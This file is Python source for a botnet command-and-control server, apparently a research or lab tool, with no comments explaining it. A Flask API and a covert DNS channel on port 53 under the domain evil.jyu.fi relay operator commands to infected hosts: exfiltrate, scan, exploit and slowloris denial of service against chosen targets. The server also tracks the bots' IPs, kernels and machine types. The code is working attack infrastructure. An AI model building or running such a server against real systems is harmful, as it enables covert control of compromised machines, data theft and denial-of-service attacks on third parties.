import json, random, sys, time, threading, traceback, socketserver
from dnslib import *
from flask import Flask, request, jsonify
from threading import Thread

app = Flask(__name__)

@app.route("/")
def hello():
    return "Simple C&C server to control bees"

@app.route("/command", methods=['GET','POST'])
def commands():
    global command
    if request.method == 'POST':
        data = request.data.decode('utf-8')
        jdata = json.loads(data)
        cmd = jdata['command']
        command['command'] = cmd
        if cmd.endswith('_'):
            command['target'] = jdata['target']
    return jsonify(command)

@app.route("/status", methods=['GET','POST'])
def status():
    global log
    if request.method == 'POST':
        bee_ips = [bee['ip'] for bee in log['sensors']]
        data = request.data.decode('utf-8')
        bee_ip = json.loads(data)['ip']
        bee_kernel = json.loads(data)['kernel']
        bee_machine = json.loads(data)['machine']
        if bee_ip not in bee_ips:
            log['sensors'].append({'ip': bee_ip, 'kernel': bee_kernel, 'machine': bee_machine, 'last_seen': time.time()})
        else:
            for bee in log['sensors']:
                if bee['ip'] == bee_ip:
                    bee['last_seen'] = time.time()
    return jsonify(log)

@app.route("/infected", methods=['GET','POST'])
def infected():
    global inected
    if request.method == 'POST':
        data = request.data.decode('utf-8')
        sensors = json.loads(data)['sensors']
        infected['sensors'] = sensors
    return jsonify(infected)


def roll_logs():
    global log
    while True:
        updated_log = {'sensors': []}
        for sensor in log['sensors']:
            if sensor['last_seen'] > time.time() - last_seen_thr + 0.5:
                updated_log['sensors'].append(sensor)
        log = updated_log
        time.sleep(1)

class UDPRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

    def handle(self):
        try:
            data = self.get_data()
            self.send_data(process_dns_query(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)

def ipv6(ipv4):
    numbers = list(map(int, ipv4.split('.')))
    return '2002:{:02x}:{:02x}:{:02x}:{:02x}'.format(*numbers)

def process_dns_query(data):
    global log, command
    D = 'evil.jyu.fi.'
    command_to_dns = {
        1: {
            'status': A('1.1.1.1'),
            'exfiltrate': A('2.2.2.2'),
            'scan_': A('3.3.3.3'),
            'exploit_': A('4.4.4.4'),
            'slowloris_': A('5.5.5.5'),
            'stop': A('255.255.255.255')
        },
        28: {
            'status': AAAA(ipv6('1.1.1.1')),
            'exfiltrate': AAAA(ipv6('2.2.2.2')),
            'scan_': AAAA(ipv6('3.3.3.3')),
            'exploit_': AAAA(ipv6('4.4.4.4')),
            'slowloris_': AAAA(ipv6('5.5.5.5')),
            'stop': AAAA(ipv6('255.255.255.255'))
        }
    }
    try:
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = request.q.qname
        qtype = request.q.qtype
        qn = str(qname)
        if qn.endswith('.' + D):
            spl = qn.split('.')
            bee_ips = [bee['ip'] for bee in log['sensors']]
            bee_ip = '.'.join(spl[0:4])
            key = spl[4]
            info = spl[5]
            print(key,type(key))
            if key == '0':
                bee_kernel = info.split(',')[0]
                bee_machine = info.split(',')[1]
                bee_info = ''
            elif key=='1':
                bee_kernel = ''
                bee_machine = ''
                bee_info = info
            if bee_ip not in bee_ips:
                log['sensors'].append(
                    {'ip': bee_ip, 'kernel': bee_kernel, 'machine': bee_machine, 'info': bee_info, 'last_seen': time.time()}
                )
            else:
                for bee in log['sensors']:
                    if bee['ip'] == bee_ip:
                        bee['last_seen'] = time.time()
                        bee['last_info'] = bee_info
            cmd = command['command']
            reply.add_answer(RR(rname=qname, rtype=qtype, rclass=1, ttl=300, rdata=command_to_dns[qtype][cmd]))
            if cmd.endswith('_'):
                target = command['target']
                if type(target) is list:
                    target = random.choice(target)
                if qtype == 1:
                    reply.add_answer(RR(rname=qname, rtype=qtype, rclass=1, ttl=300, rdata=A(target)))
                elif qtype == 28:
                    reply.add_answer(RR(rname=qname, rtype=qtype, rclass=1, ttl=300, rdata=AAAA(ipv6(target))))
    except Exception as e:
        print(e)
        pass
    return reply.pack()


if __name__ == '__main__':
    command = {'command': 'status'}
    log = {'sensors': []}
    infected = {'sensors': []}
    last_seen_thr = 60
    roll_logs_thread = Thread(target=roll_logs)
    roll_logs_thread.setDaemon(True)
    roll_logs_thread.start()
    servers = [
        socketserver.ThreadingUDPServer(('', 53), UDPRequestHandler),
    ]
    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more$
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
    app.run(host='0.0.0.0',port=80)
